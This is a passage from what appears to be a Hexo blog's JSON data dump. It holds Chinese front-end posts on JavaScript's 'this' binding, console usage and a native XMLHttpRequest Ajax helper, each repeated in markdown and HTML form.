环境执行\nobj.f()\n````\n\n## 四、环境变量\nJavaScript 允许在函数体内部，引用当前环境的其他变量。\n````\nvar f = function () {\n  console.log(x);\n};\n````\n上面代码中，函数体里面使用了变量`x`。该变量由运行环境提供。\n\n现在问题就来了，由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在`函数体内部获得当前的运行环境（context）`。所以，`this就出现`了，它的`设计目的`就是在函数体内部，指代函数当前的运行环境。\n\n````\nvar f = function () {\n  console.log(this.x);\n}\n````\n上面代码中，函数体里面的this.x就是指当前运行环境的x。\n\n````\nvar f = function () {\n  console.log(this.x);\n}\nvar x = 1;\nvar obj = {\n  f: f,\n  x: 2,\n};\n// 单独执行\nf() // 1\n// obj 环境执行\nobj.f() // 2\n````\n上面代码中，函数f在全局环境执行，this.x指向全局环境的x。\n![](https://mmbiz.qpic.cn/mmbiz_png/btsCOHx9LAOGjicfd5I43teJ3ickrLuhxcIaH1qiaI67Lt0fZ31q7eTFIqIBcg8mViacnWQD4MChFlaicu4HaUX4SKw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1)\n\n在obj环境执行，this.x指向obj.x\n![](https://mmbiz.qpic.cn/mmbiz_png/btsCOHx9LAOGjicfd5I43teJ3ickrLuhxco6hl0vCicIXHMat4Kgt1UgdoniaMMldWogk74hVyia9DIXBHbIe142BtQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1)\n\n回到本文开头提出的问题，obj.foo()是通过obj找到foo，所以就是在obj环境执行。一旦var foo = obj.foo，变量foo就直接指向函数本身，所以foo()就变成在全局环境执行。\n\n---\n[阅读原文](http://www.ruanyifeng.com/blog/2018/06/javascript-this.html) 作者：阮一峰","source":"_posts/FrontEnd/JS/JavaScript-this-原理.md","raw":"---\ntitle: JavaScript`this`原理\ndate: 2018-06-22 15:20:13\ntags: JS-this原理\ncategories: JS\n---\n# JavaScript 的 this 原理\n## 一、问题的由来\n学懂 JavaScript 语言，一个标志就是理解下面两种写法，可能有不一样的结果。\n\n````\nvar obj = {\n  foo: function () {}\n};\nvar foo = obj.foo;\n// 写法一\nobj.foo()\n// 写法二\nfoo()\n````\n上面代码中，虽然obj.foo和foo指向同一个函数，但是执行结果可能不一样。请看下面的例子。\n\n````\nvar obj = {\n  foo: function () { console.log(this.bar) },\n  bar: 1\n};\nvar foo = obj.foo;\nvar bar = 2;\nobj.foo() // 1\nfoo() // 2\n````\n\n这种差异的原因，就在于函数体内部使用了`this`关键字。很多教科书会告诉你，this指的是函数运行时所在的环境。\n对于obj.foo()来说，foo运行在obj环境，所以this指向obj；对于foo()来说，foo运行在全局环境，所以this指向全局环境。所以，两者的运行结果不一样。\n\n这种解释没错，但是教科书往往不告诉你，为什么会这样？也就是说，函数的运行环境到底是怎么决定的？举例来说，为什么obj.foo()就是在obj环境执行，而一旦var foo = obj.foo，foo()就变成在全局环境执行？\n\n本文就来解释 JavaScript 这样处理的原理。理解了这一点，你就会彻底理解this的作用。\n\n## 二、内存的数据结构\nJavaScript 语言之所以有`this`的设计，跟`内存`里面的`数据结构`有关系。\n\n````\nvar obj = { foo:  5 };\n````\n\n上面的代码将一个`对象`赋值给变量`obj`。JavaScript 引擎会先在`内存`里面，`生成一个对象{ foo: 5 }`，然后把这个对象的`内存地址`赋值给变量obj。\n\n也就是说，变量obj是一个地址 (reference) 。后面如果要读取obj.foo，引擎先从obj拿到内存地址，然后再从该地址读出原始的对象，返回它的foo属性。\n\n`原始的对象`以`字典结构`保存，每一个属性名都`对应`一个属性描述对象。举例来说，上面例子的foo属性，实际上是以下面的形式保存的。\n\n**注意**：foo属性的值保存在属性描述对象的value属性里面。\n\n## 三、函数\n这样的结构是很清晰的，问题在于属性的值可能是一个`函数`。\n\n````\nvar obj = { foo: function () {} };\n````\n这时，引擎会将函数单独保存在内存中，然后再将函数的地址赋值给foo属性的value属性。\n\n````\n{\n  foo: {\n    [[value]]: 函数的地址\n    ...\n  }\n}\n````\n\n由于函数是一个单独的值，所以它可以在不同的环境（上下文）执行。\n\n````\nvar f = function () {};\nvar obj = { f: f };\n// 单独执行\nf()\n// obj 环境执行\nobj.f()\n````\n\n## 四、环境变量\nJavaScript 允许在函数体内部，引用当前环境的其他变量。\n````\nvar f = function () {\n  console.log(x);\n};\n````\n上面代码中，函数体里面使用了变量`x`。该变量由运行环境提供。\n\n现在问题就来了，由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在`函数体内部获得当前的运行环境（context）`。所以，`this就出现`了，它的`设计目的`就是在函数体内部，指代函数当前的运行环境。\n\n````\nvar f = function () {\n  console.log(this.x);\n}\n````\n上面代码中，函数体里面的this.x就是指当前运行环境的x。\n\n````\nvar f = function () {\n  console.log(this.x);\n}\nvar x = 1;\nvar obj = {\n  f: f,\n  x: 2,\n};\n// 单独执行\nf() // 1\n// obj 环境执行\nobj.f() // 2\n````\n上面代码中，函数f在全局环境执行，this.x指向全局环境的x。\n![](https://mmbiz.qpic.cn/mmbiz_png/btsCOHx9LAOGjicfd5I43teJ3ickrLuhxcIaH1qiaI67Lt0fZ31q7eTFIqIBcg8mViacnWQD4MChFlaicu4HaUX4SKw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1)\n\n在obj环境执行，this.x指向obj.x\n![](https://mmbiz.qpic.cn/mmbiz_png/btsCOHx9LAOGjicfd5I43teJ3ickrLuhxco6hl0vCicIXHMat4Kgt1UgdoniaMMldWogk74hVyia9DIXBHbIe142BtQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1)\n\n回到本文开头提出的问题，obj.foo()是通过obj找到foo，所以就是在obj环境执行。一旦var foo = obj.foo，变量foo就直接指向函数本身，所以foo()就变成在全局环境执行。\n\n---\n[阅读原文](http://www.ruanyifeng.com/blog/2018/06/javascript-this.html) 作者：阮一峰","slug":"FrontEnd/JS/JavaScript-this-原理","published":1,"updated":"2018-06-22T07:47:34.456Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2cj006ob8xj0iovr0ia","content":"<h1 id=\"JavaScript-的-this-原理\"><a href=\"#JavaScript-的-this-原理\" class=\"headerlink\" title=\"JavaScript 的 this 原理\"></a>JavaScript 的 this 原理</h1><h2 id=\"一、问题的由来\"><a href=\"#一、问题的由来\" class=\"headerlink\" title=\"一、问题的由来\"></a>一、问题的由来</h2><p>学懂 JavaScript 语言，一个标志就是理解下面两种写法，可能有不一样的结果。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">  foo: function () &#123;&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">var foo = obj.foo;</span><br><span class=\"line\">// 写法一</span><br><span class=\"line\">obj.foo()</span><br><span class=\"line\">// 写法二</span><br><span class=\"line\">foo()</span><br></pre></td></tr></table></figure>\n<p>上面代码中，虽然obj.foo和foo指向同一个函数，但是执行结果可能不一样。请看下面的例子。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">  foo: function () &#123; console.log(this.bar) &#125;,</span><br><span class=\"line\">  bar: 1</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">var foo = obj.foo;</span><br><span class=\"line\">var bar = 2;</span><br><span class=\"line\">obj.foo() // 1</span><br><span class=\"line\">foo() // 2</span><br></pre></td></tr></table></figure>\n<p>这种差异的原因，就在于函数体内部使用了<code>this</code>关键字。很多教科书会告诉你，this指的是函数运行时所在的环境。<br>对于obj.foo()来说，foo运行在obj环境，所以this指向obj；对于foo()来说，foo运行在全局环境，所以this指向全局环境。所以，两者的运行结果不一样。</p>\n<p>这种解释没错，但是教科书往往不告诉你，为什么会这样？也就是说，函数的运行环境到底是怎么决定的？举例来说，为什么obj.foo()就是在obj环境执行，而一旦var foo = obj.foo，foo()就变成在全局环境执行？</p>\n<p>本文就来解释 JavaScript 这样处理的原理。理解了这一点，你就会彻底理解this的作用。</p>\n<h2 id=\"二、内存的数据结构\"><a href=\"#二、内存的数据结构\" class=\"headerlink\" title=\"二、内存的数据结构\"></a>二、内存的数据结构</h2><p>JavaScript 语言之所以有<code>this</code>的设计，跟<code>内存</code>里面的<code>数据结构</code>有关系。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123; foo:  5 &#125;;</span><br></pre></td></tr></table></figure>\n<p>上面的代码将一个<code>对象</code>赋值给变量<code>obj</code>。JavaScript 引擎会先在<code>内存</code>里面，<code>生成一个对象{ foo: 5 }</code>，然后把这个对象的<code>内存地址</code>赋值给变量obj。</p>\n<p>也就是说，变量obj是一个地址 (reference) 。后面如果要读取obj.foo，引擎先从obj拿到内存地址，然后再从该地址读出原始的对象，返回它的foo属性。</p>\n<p><code>原始的对象</code>以<code>字典结构</code>保存，每一个属性名都<code>对应</code>一个属性描述对象。举例来说，上面例子的foo属性，实际上是以下面的形式保存的。</p>\n<p><strong>注意</strong>：foo属性的值保存在属性描述对象的value属性里面。</p>\n<h2 id=\"三、函数\"><a href=\"#三、函数\" class=\"headerlink\" title=\"三、函数\"></a>三、函数</h2><p>这样的结构是很清晰的，问题在于属性的值可能是一个<code>函数</code>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123; foo: function () &#123;&#125; &#125;;</span><br></pre></td></tr></table></figure>\n<p>这时，引擎会将函数单独保存在内存中，然后再将函数的地址赋值给foo属性的value属性。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  foo: &#123;</span><br><span class=\"line\">    [[value]]: 函数的地址</span><br><span class=\"line\">    ...</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由于函数是一个单独的值，所以它可以在不同的环境（上下文）执行。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var f = function () &#123;&#125;;</span><br><span class=\"line\">var obj = &#123; f: f &#125;;</span><br><span class=\"line\">// 单独执行</span><br><span class=\"line\">f()</span><br><span class=\"line\">// obj 环境执行</span><br><span class=\"line\">obj.f()</span><br></pre></td></tr></table></figure>\n<h2 id=\"四、环境变量\"><a href=\"#四、环境变量\" class=\"headerlink\" title=\"四、环境变量\"></a>四、环境变量</h2><p>JavaScript 允许在函数体内部，引用当前环境的其他变量。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var f = function () &#123;</span><br><span class=\"line\">  console.log(x);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>上面代码中，函数体里面使用了变量<code>x</code>。该变量由运行环境提供。</p>\n<p>现在问题就来了，由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在<code>函数体内部获得当前的运行环境（context）</code>。所以，<code>this就出现</code>了，它的<code>设计目的</code>就是在函数体内部，指代函数当前的运行环境。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var f = function () &#123;</span><br><span class=\"line\">  console.log(this.x);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面代码中，函数体里面的this.x就是指当前运行环境的x。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var f = function () &#123;</span><br><span class=\"line\">  console.log(this.x);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var x = 1;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">  f: f,</span><br><span class=\"line\">  x: 2,</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">// 单独执行</span><br><span class=\"line\">f() // 1</span><br><span class=\"line\">// obj 环境执行</span><br><span class=\"line\">obj.f() // 2</span><br></pre></td></tr></table></figure>\n<p>上面代码中，函数f在全局环境执行，this.x指向全局环境的x。<br><img src=\"https://mmbiz.qpic.cn/mmbiz_png/btsCOHx9LAOGjicfd5I43teJ3ickrLuhxcIaH1qiaI67Lt0fZ31q7eTFIqIBcg8mViacnWQD4MChFlaicu4HaUX4SKw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\" alt=\"\"></p>\n<p>在obj环境执行，this.x指向obj.x<br><img src=\"https://mmbiz.qpic.cn/mmbiz_png/btsCOHx9LAOGjicfd5I43teJ3ickrLuhxco6hl0vCicIXHMat4Kgt1UgdoniaMMldWogk74hVyia9DIXBHbIe142BtQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\" alt=\"\"></p>\n<p>回到本文开头提出的问题，obj.foo()是通过obj找到foo，所以就是在obj环境执行。一旦var foo = obj.foo，变量foo就直接指向函数本身，所以foo()就变成在全局环境执行。</p>\n<hr>\n<p><a href=\"http://www.ruanyifeng.com/blog/2018/06/javascript-this.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a> 作者：阮一峰</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"JavaScript-的-this-原理\"><a href=\"#JavaScript-的-this-原理\" class=\"headerlink\" title=\"JavaScript 的 this 原理\"></a>JavaScript 的 this 原理</h1><h2 id=\"一、问题的由来\"><a href=\"#一、问题的由来\" class=\"headerlink\" title=\"一、问题的由来\"></a>一、问题的由来</h2><p>学懂 JavaScript 语言，一个标志就是理解下面两种写法，可能有不一样的结果。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">  foo: function () &#123;&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">var foo = obj.foo;</span><br><span class=\"line\">// 写法一</span><br><span class=\"line\">obj.foo()</span><br><span class=\"line\">// 写法二</span><br><span class=\"line\">foo()</span><br></pre></td></tr></table></figure>\n<p>上面代码中，虽然obj.foo和foo指向同一个函数，但是执行结果可能不一样。请看下面的例子。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">  foo: function () &#123; console.log(this.bar) &#125;,</span><br><span class=\"line\">  bar: 1</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">var foo = obj.foo;</span><br><span class=\"line\">var bar = 2;</span><br><span class=\"line\">obj.foo() // 1</span><br><span class=\"line\">foo() // 2</span><br></pre></td></tr></table></figure>\n<p>这种差异的原因，就在于函数体内部使用了<code>this</code>关键字。很多教科书会告诉你，this指的是函数运行时所在的环境。<br>对于obj.foo()来说，foo运行在obj环境，所以this指向obj；对于foo()来说，foo运行在全局环境，所以this指向全局环境。所以，两者的运行结果不一样。</p>\n<p>这种解释没错，但是教科书往往不告诉你，为什么会这样？也就是说，函数的运行环境到底是怎么决定的？举例来说，为什么obj.foo()就是在obj环境执行，而一旦var foo = obj.foo，foo()就变成在全局环境执行？</p>\n<p>本文就来解释 JavaScript 这样处理的原理。理解了这一点，你就会彻底理解this的作用。</p>\n<h2 id=\"二、内存的数据结构\"><a href=\"#二、内存的数据结构\" class=\"headerlink\" title=\"二、内存的数据结构\"></a>二、内存的数据结构</h2><p>JavaScript 语言之所以有<code>this</code>的设计，跟<code>内存</code>里面的<code>数据结构</code>有关系。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123; foo:  5 &#125;;</span><br></pre></td></tr></table></figure>\n<p>上面的代码将一个<code>对象</code>赋值给变量<code>obj</code>。JavaScript 引擎会先在<code>内存</code>里面，<code>生成一个对象{ foo: 5 }</code>，然后把这个对象的<code>内存地址</code>赋值给变量obj。</p>\n<p>也就是说，变量obj是一个地址 (reference) 。后面如果要读取obj.foo，引擎先从obj拿到内存地址，然后再从该地址读出原始的对象，返回它的foo属性。</p>\n<p><code>原始的对象</code>以<code>字典结构</code>保存，每一个属性名都<code>对应</code>一个属性描述对象。举例来说，上面例子的foo属性，实际上是以下面的形式保存的。</p>\n<p><strong>注意</strong>：foo属性的值保存在属性描述对象的value属性里面。</p>\n<h2 id=\"三、函数\"><a href=\"#三、函数\" class=\"headerlink\" title=\"三、函数\"></a>三、函数</h2><p>这样的结构是很清晰的，问题在于属性的值可能是一个<code>函数</code>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123; foo: function () &#123;&#125; &#125;;</span><br></pre></td></tr></table></figure>\n<p>这时，引擎会将函数单独保存在内存中，然后再将函数的地址赋值给foo属性的value属性。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  foo: &#123;</span><br><span class=\"line\">    [[value]]: 函数的地址</span><br><span class=\"line\">    ...</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由于函数是一个单独的值，所以它可以在不同的环境（上下文）执行。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var f = function () &#123;&#125;;</span><br><span class=\"line\">var obj = &#123; f: f &#125;;</span><br><span class=\"line\">// 单独执行</span><br><span class=\"line\">f()</span><br><span class=\"line\">// obj 环境执行</span><br><span class=\"line\">obj.f()</span><br></pre></td></tr></table></figure>\n<h2 id=\"四、环境变量\"><a href=\"#四、环境变量\" class=\"headerlink\" title=\"四、环境变量\"></a>四、环境变量</h2><p>JavaScript 允许在函数体内部，引用当前环境的其他变量。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var f = function () &#123;</span><br><span class=\"line\">  console.log(x);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>上面代码中，函数体里面使用了变量<code>x</code>。该变量由运行环境提供。</p>\n<p>现在问题就来了，由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在<code>函数体内部获得当前的运行环境（context）</code>。所以，<code>this就出现</code>了，它的<code>设计目的</code>就是在函数体内部，指代函数当前的运行环境。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var f = function () &#123;</span><br><span class=\"line\">  console.log(this.x);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面代码中，函数体里面的this.x就是指当前运行环境的x。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var f = function () &#123;</span><br><span class=\"line\">  console.log(this.x);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var x = 1;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">  f: f,</span><br><span class=\"line\">  x: 2,</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">// 单独执行</span><br><span class=\"line\">f() // 1</span><br><span class=\"line\">// obj 环境执行</span><br><span class=\"line\">obj.f() // 2</span><br></pre></td></tr></table></figure>\n<p>上面代码中，函数f在全局环境执行，this.x指向全局环境的x。<br><img src=\"https://mmbiz.qpic.cn/mmbiz_png/btsCOHx9LAOGjicfd5I43teJ3ickrLuhxcIaH1qiaI67Lt0fZ31q7eTFIqIBcg8mViacnWQD4MChFlaicu4HaUX4SKw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\" alt=\"\"></p>\n<p>在obj环境执行，this.x指向obj.x<br><img src=\"https://mmbiz.qpic.cn/mmbiz_png/btsCOHx9LAOGjicfd5I43teJ3ickrLuhxco6hl0vCicIXHMat4Kgt1UgdoniaMMldWogk74hVyia9DIXBHbIe142BtQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\" alt=\"\"></p>\n<p>回到本文开头提出的问题，obj.foo()是通过obj找到foo，所以就是在obj环境执行。一旦var foo = obj.foo，变量foo就直接指向函数本身，所以foo()就变成在全局环境执行。</p>\n<hr>\n<p><a href=\"http://www.ruanyifeng.com/blog/2018/06/javascript-this.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a> 作者：阮一峰</p>\n"},{"title":"ResizeObserver","date":"2018-05-17T01:59:17.000Z","_content":"## JS中ResizeObserver\n\n什么是观察者(Observer)\n\n\n-----------------\n[阅读原文](http://www.w3cplus.com/javascript/ResizeObserver-api.html)","source":"_posts/FrontEnd/JS/ResizeObserver.md","raw":"---\ntitle: ResizeObserver\ndate: 2018-05-17 09:59:17\ntags: ResizeObserver\ncategories: JSApi\n---\n## JS中ResizeObserver\n\n什么是观察者(Observer)\n\n\n-----------------\n[阅读原文](http://www.w3cplus.com/javascript/ResizeObserver-api.html)","slug":"FrontEnd/JS/ResizeObserver","published":1,"updated":"2018-06-22T01:08:50.904Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2cl006sb8xj0me2fv5q","content":"<h2 id=\"JS中ResizeObserver\"><a href=\"#JS中ResizeObserver\" class=\"headerlink\" title=\"JS中ResizeObserver\"></a>JS中ResizeObserver</h2><p>什么是观察者(Observer)</p>\n<hr>\n<p><a href=\"http://www.w3cplus.com/javascript/ResizeObserver-api.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"JS中ResizeObserver\"><a href=\"#JS中ResizeObserver\" class=\"headerlink\" title=\"JS中ResizeObserver\"></a>JS中ResizeObserver</h2><p>什么是观察者(Observer)</p>\n<hr>\n<p><a href=\"http://www.w3cplus.com/javascript/ResizeObserver-api.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"函数防抖与函数节流","date":"2018-07-03T08:52:51.000Z","_content":"## 函数防抖动与节流\n\n---\n[阅读原文](http://web.jobbole.com/94844/)","source":"_posts/FrontEnd/JS/函数防抖与函数节流.md","raw":"---\ntitle: 函数防抖与函数节流\ndate: 2018-07-03 16:52:51\ntags: 函数防抖/节流\ncategories: JS\n---\n## 函数防抖动与节流\n\n---\n[阅读原文](http://web.jobbole.com/94844/)","slug":"FrontEnd/JS/函数防抖与函数节流","published":1,"updated":"2018-07-04T10:25:40.446Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2co006vb8xjnb5stozc","content":"<h2 id=\"函数防抖动与节流\"><a href=\"#函数防抖动与节流\" class=\"headerlink\" title=\"函数防抖动与节流\"></a>函数防抖动与节流</h2><hr>\n<p><a href=\"http://web.jobbole.com/94844/\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"函数防抖动与节流\"><a href=\"#函数防抖动与节流\" class=\"headerlink\" title=\"函数防抖动与节流\"></a>函数防抖动与节流</h2><hr>\n<p><a href=\"http://web.jobbole.com/94844/\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"console食用方法","date":"2018-06-12T06:31:29.000Z","_content":"# console的食用方法\n\n  **console.log**\n\n  **console.dir**\n\n    打印方法 ","source":"_posts/FrontEnd/JS/console食用方法.md","raw":"---\ntitle: console食用方法\ndate: 2018-06-12 14:31:29\ntags: console\ncategories: JS-console\n---\n# console的食用方法\n\n  **console.log**\n\n  **console.dir**\n\n    打印方法 ","slug":"FrontEnd/JS/console食用方法","published":1,"updated":"2018-06-12T06:32:41.712Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2cp006yb8xj20f7bnzq","content":"<h1 id=\"console的食用方法\"><a href=\"#console的食用方法\" class=\"headerlink\" title=\"console的食用方法\"></a>console的食用方法</h1><p>  <strong>console.log</strong></p>\n<p>  <strong>console.dir</strong></p>\n<pre><code>打印方法 \n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"console的食用方法\"><a href=\"#console的食用方法\" class=\"headerlink\" title=\"console的食用方法\"></a>console的食用方法</h1><p>  <strong>console.log</strong></p>\n<p>  <strong>console.dir</strong></p>\n<pre><code>打印方法 \n</code></pre>"},{"title":"原生Ajax请求","date":"2018-04-16T08:01:01.000Z","archives":"原生Ajax请求","_content":"# 原生Ajax请求\n````\n    function ajax(options) {\n      options = options || {};\n      options.type = (options.type || \"GET\").toUpperCase();\n      options.dataType = options.dataType || \"json\";\n      var params = formatParams(options.data);\n\n      //创建 - 非IE6 - 第一步\n      if (window.XMLHttpRequest) {\n        var xhr = new XMLHttpRequest();\n      } else { //IE6及其以下版本浏览器\n        var xhr = new ActiveXObject('Microsoft.XMLHTTP');\n      }\n\n      //接收 - 第三步\n      xhr.onreadystatechange = function () {\n        if (xhr.readyState == 4) {\n          var status = xhr.status;\n          if (status >= 200 && status < 300) {\n            options.success && options.success(xhr.responseText, xhr.responseXML);\n          } else {\n            options.fail && options.fail(status);\n          }\n        }\n      }\n\n      //连接 和 发送 - 第二步\n      if (options.type == \"GET\") {\n        xhr.open(\"GET\", options.url + \"?\" + params, true);\n        xhr.send(null);\n      } else if (options.type == \"POST\") {\n        xhr.open(\"POST\", options.url, true);\n        //设置表单提交时的内容类型\n        xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        xhr.send(params);\n      }\n    }\n    \n    //格式化参数\n    function formatParams(data) {\n      var arr = [];\n      for (var name in data) {\n        arr.push(encodeURIComponent(name) + \"=\" + encodeURIComponent(data[name]));\n      }\n      arr.push((\"v=\" + Math.random()).replace(\".\", \"\"));\n      // console.log(arr.join(\"&\"));\n      return arr.join(\"&\");\n    }\n````","source":"_posts/FrontEnd/JS/原生Ajax请求.md","raw":"---\ntitle: 原生Ajax请求\ndate: 2018-04-16 16:01:01\ntags: 原生Ajax\narchives: 原生Ajax请求\ncategories: Ajax\n---\n# 原生Ajax请求\n````\n    function ajax(options) {\n      options = options || {};\n      options.type = (options.type || \"GET\").toUpperCase();\n      options.dataType = options.dataType || \"json\";\n      var params = formatParams(options.data);\n\n      //创建 - 非IE6 - 第一步\n      if (window.XMLHttpRequest) {\n        var xhr = new XMLHttpRequest();\n      } else { //IE6及其以下版本浏览器\n        var xhr = new ActiveXObject('Microsoft.XMLHTTP');\n      }\n\n      //接收 - 第三步\n      xhr.onreadystatechange = function () {\n        if (xhr.readyState == 4) {\n          var status = xhr.status;\n          if (status >= 200 && status < 300) {\n            options.success && options.success(xhr.responseText, xhr.responseXML);\n          } else {\n            options.fail && options.fail(status);\n          }\n        }\n      }\n\n      //连接 和 发送 - 第二步\n      if (options.type == \"GET\") {\n        xhr.open(\"GET\", options.url + \"?\" + params, true);\n        xhr.send(null);\n      } else if (options.type == \"POST\") {\n        xhr.open(\"POST\", options.url, true);\n        //设置表单提交时的内容类型\n        xhr.setRequestHeader(\"Content-Type\", 